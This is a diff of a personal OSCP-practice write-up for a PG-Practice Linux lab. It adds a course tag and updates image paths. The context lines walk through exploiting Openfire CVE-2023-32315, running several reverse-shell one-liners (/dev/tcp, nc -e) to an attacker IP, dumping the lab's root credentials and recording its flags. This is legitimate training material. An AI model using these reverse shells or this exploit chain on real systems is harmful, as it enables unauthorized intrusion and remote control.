@@ -1,5 +1,6 @@
 ---
 Date: 2024-10-12
+Course: "[[OSCP]]"
 Platform: PG-Practice
 Category: Linux
 Difficulty: Intermediate
@@ -149,32 +150,32 @@ PORT     STATE SERVICE             VERSION
 No enumeration conducted
 ## Port 9090 - HTTP
 - Navigated to `http://192.168.215.96:9090` and identified `Openfire v4.7.3`
-![[Pasted image 20241012114639.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012114639.png]]
 - Attempted access with credentials `admin:admin` - unsuccessful
-![[Pasted image 20241012114928.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012114928.png]]
 ## Port 9091 - 
 - Navigated to `http://192.168.215.96:9091` 
-![[Pasted image 20241012115719.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012115719.png]]
 
 ---
 # Exploitation
 ## CVE-2023-32315
 - Found `CVE-2023-32315.py` exploit at [https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT], copied to local host and ran `python3 CVE-2023-32315.py -u http://192.168.215.96:9090`
-![[Pasted image 20241012115241.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012115241.png]]
 - Used newly created credentials `hugme:HugmeNOW` to login to `Openfire` console
-![[Pasted image 20241012115409.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012115409.png]]
 
 ---
 # Lateral Movement to user
 ## Local Enumeration
 - Navigated to `server information` and found details on target host
-![[Pasted image 20241012120146.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012120146.png]]
 - Navigated to Security Audit Log Viewer and identified `b99aid` has logged into admin console
-![[Pasted image 20241012120313.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012120313.png]]
 - Conducted further research and found similar exploit with additional instructions at [https://github.com/miko550/CVE-2023-32315]. Downloaded `openfire-management-tool-plugin.jar` and uploaded to Openfire "Plugins" tab
-![[Pasted image 20241012121734.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012121734.png]]
 - Navigated to "Server > Server Settings > Management Tool > System Command" and tested command execution
-![[Pasted image 20241012121905.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012121905.png]]
 - Ran `nc -nvlp 4444` to setup netcat listener on local host
 - Tested multiple reverse shell commands on target including;
 	- `/bin/sh -i >& /dev/tcp/192.168.45.250/4444 0>&1`
@@ -183,31 +184,31 @@ No enumeration conducted
 	- `ncat 192.168.45.250 4444 -e /bin/sh`
 	- `busybox nc 192.168.45.250 4444 -e /bin/sh`
 - Achieved reverse shell with `busybox nc 192.168.45.250 4444 -e /bin/sh` as user `openfire`
-![[Pasted image 20241012122500.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012122500.png]]
 - Ran `cat /home/openfire/local.txt` to print `80a99c502edc13ab1a6b38ee03c9b7b9`
-![[Pasted image 20241012122729.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012122729.png]]
 ---
 # Privilege Escalation
 ## Local Enumeration
 - Ran `sudo -l` - requires password for `openfire`
-![[Pasted image 20241012122834.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012122834.png]]
 - Ran `cat /etc/passwd` to find other users
-![[Pasted image 20241012123225.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012123225.png]]
 - Uploaded `linpeas.sh` to directory `/usr/share/plugins` and ran `./linpeas.sh`
-![[Pasted image 20241012123812.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012123812.png]]
  - Identified `sudo` version 1.8.3 - potentially vulnerable to CVE-2021-3156
-![[Pasted image 20241012101046.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012101046.png]]
 -  Identified vulnerable to CVE-2021-3560
-![[Pasted image 20241012101134.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012101134.png]]
 - Interesting files in `/etc`
-![[Pasted image 20241012124238.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012124238.png]]
 ## Privilege Escalation vector
 - Enumerated files in `/usr/share/openfire`, identified script `/usr/share/openfire/embedded-db/openfire.script` and ran `cat openfire.script`
-![[Pasted image 20241012132623.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012132623.png]]
 - Identified password hashes as well as cleartext credentials `root:OpenFireAtEveryone`
-![[Pasted image 20241012132754.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012132754.png]]
 - SSH login with credentials `root:OpenFireAtEveryone`
-![[Pasted image 20241012133249.png]]
+![[Cybersecurity-Resources/images/Pasted image 20241012133249.png]]
 - Ran `cat /root/proof.txt` to print `d02d097957bef575a1e5d0883f9b0e83`
 ---
 # Trophy & Loot
